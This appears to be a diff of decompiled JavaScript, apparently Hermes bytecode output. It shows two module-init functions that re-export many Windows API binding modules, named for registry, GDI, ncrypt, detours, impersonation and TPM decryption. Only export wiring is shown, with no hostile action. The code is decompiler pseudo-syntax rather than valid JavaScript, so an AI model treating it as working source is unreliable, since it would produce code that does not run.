+	{
+		ACCU = Object["create"]
+		if (Object["create"])
+		{
+			ACCU = func_export_0x100004fc7
+		}
+		else
+		{
+			ACCU = func_copyProperty_0x100004fc9
+		}
+	}
+	Scope[6804][7] = ACCU
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__exportStar"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_assignProps_0x100004fcb
+	}
+	r1 = ACCU
+	r3 = Object["defineProperty"]
+	r6 = "__esModule"
+	r7 = new {"value": <true}
+	ACCU = r3(a0, r6, r7)
+	r6 = func_esModule_0x100004e77["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_windowCommands_0x100004e8e["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_fileAttributes_0x100004ea8["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_initRegistry_0x100004eb4["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_defineConstants_0x100004efa["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_powerSchema_0x100004fb8["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_initGdi_0x100004f42["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_initNcrypt_0x100004f63["exports"]()
+	ACCU = r1(r6, a0)
+	return undefined
+}
+function func_initExports_0x100004fb6(a0)
+{
+	Scope[6809][9] = func_x_0x100004f93
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__createBinding"]
+	}
+	if (!ACCU)
+	{
+		ACCU = Object["create"]
+		if (Object["create"])
+		{
+			ACCU = func_defineGetter_0x100004fb1
+		}
+		else
+		{
+			ACCU = func_copyProp_0x100004fb3
+		}
+	}
+	Scope[6809][8] = ACCU
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__exportStar"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_assignEntries_0x100004fb5
+	}
+	r1 = ACCU
+	r3 = Object["defineProperty"]
+	r6 = "__esModule"
+	r7 = new {"value": <true}
+	ACCU = r3(a0, r6, r7)
+	r6 = func_initDetours_0x100004e25["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_ExportIcons_0x100004e36["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_exportPaths_0x100004e41["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_Wake_0x100004e4c["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_ExportProxy_0x100004e54["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_processExports_0x100004e6a["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_exportCopy_0x100004e75["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_exportWindows_0x100004e8c["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_exportWindows_0x100004ea6["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_export_0x100004eb2["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_initRegistry_0x100004ef8["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_exportServices_0x100004f16["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_power_0x100004f28["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_export_0x100004f34["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_registerImpersonation_0x100004f40["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_initGdi_0x100004f4f["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_exportDefault_0x100004f59["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_exportProtect_0x100004f61["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_exportCrypto_0x100004f82["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_exportTpmDecrypt_0x100004f8a["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_closeHandle_0x100004f92["exports"]()
+	ACCU = r1(r6, a0)
+	return undefined
+}
